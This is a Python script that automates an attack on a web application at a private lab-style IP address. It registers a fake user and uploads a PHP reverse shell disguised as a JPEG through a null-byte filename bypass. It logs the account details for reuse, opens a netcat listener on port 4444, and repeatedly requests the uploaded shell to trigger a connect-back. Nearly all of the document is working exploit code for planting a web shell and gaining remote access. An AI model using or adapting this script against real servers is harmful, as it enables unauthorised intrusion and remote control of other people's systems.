#!/usr/bin/python
import re
import requests
import mechanize
import webbrowser
from random import randint
from subprocess import call

listofusers =[]
br = mechanize.Browser()

#Open Reg page to create random user to upload and attack with
br.open('http://10.14.4.14/users/register.php')

br.form = list(br.forms())[1]  #retrieve second form (ie form to fill out
br.set_all_readonly(False)    # allow changing the .value of all controls

user = 'Chameleon' + str(randint(0, 100))  # Integer from 1 to 100, endpoints included
password = 'password'

#write out hackers details to file to access same reverse shell later on if they would like too 
#################################
file= open("hackersDetails.txt","w+")
file.write('Username \t  Password \t UserId')
file.write(user+'\t'+ password + '\t')
#################################

#Ref to learn how to fill out form -https://stackoverflow.com/questions/22294489/using-mechanize-python-to-fill-form

#fill form to create user
br['username'] = user
br['firstname'] = 'Hacker'
br['lastname'] = 'Mann'
br['password'] = password
br['againpass'] = password
br.method = "POST"
br.submit()

#Open upload page
br.open('http://10.14.4.14/pictures/upload.php')
filename = raw_input("Path to Payload - ")
br.form = list(br.forms())[1]
br.set_all_readonly(False)    # allow changing the .value of all controls
br.form.add_file(open('/root/'+filename+'/php-reverse-shell.php%00.jpeg', 'r'),'image/jpeg', filename, name='pic')

#fill form to upload the above payload
br['tag'] = 'Trees_I_Guess'
br['name'] = 'php-reverse-shell.php'#needs to be the same as the above payload name
br['title'] = 'Totally safe - trust me'
br['price'] = '0'
br.method = "POST"
br.submit()

br.open("http://10.14.4.14/upload/")
for link in br.links():
	listofusers.append(link.text)
	userid = listofusers[len(listofusers)-2] #retrieve the second last link in a list of all the recent uploads because we create a new user everytime we upload the payload it will always be the most recent userid to upload
file.write(userid)
file.close()
print userid
call(["gnome-terminal", "-e", "nc -lvp 4444"])
Link = "http://10.14.4.14/upload/"+userid+"Trees_I_Guess/php-reverse-shell.php/"
print Link
br.open(Link)
br.open(Link)
br.open(Link)